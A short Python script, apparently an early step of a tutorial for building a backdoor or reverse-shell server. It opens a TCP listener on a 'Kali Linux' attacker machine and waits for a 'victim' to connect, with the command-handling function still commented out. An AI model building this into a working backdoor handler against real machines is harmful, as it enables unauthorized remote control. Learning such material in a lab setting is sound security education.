# Socket allows us to initiate an internet connection between 2 machines
import socket

# socket.AF_INET -> tells our program that it's ipv4
# socket.SOCK_STREAM -> tells our program that we'll use TCP
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# We bind the server to the HOST (KALI LINUX MACHINE)
sock.bind(('192.168.1.17', 5555))

# We must start listening the incoming connection (VICTIM MACHINE)
print('[*] Listening for the incoming connection')
# Our program will be stuck on this part until the connection established
# 5 mean that we will listen up to 5 connections
sock.listen(5)
# Once the VICTIM connect -> we retrieve the informations of the connection
target, ip = sock.accept()
print(f'[+] Target connected from {str(ip)}')
# target_communication()

# TODO Try to request from different machines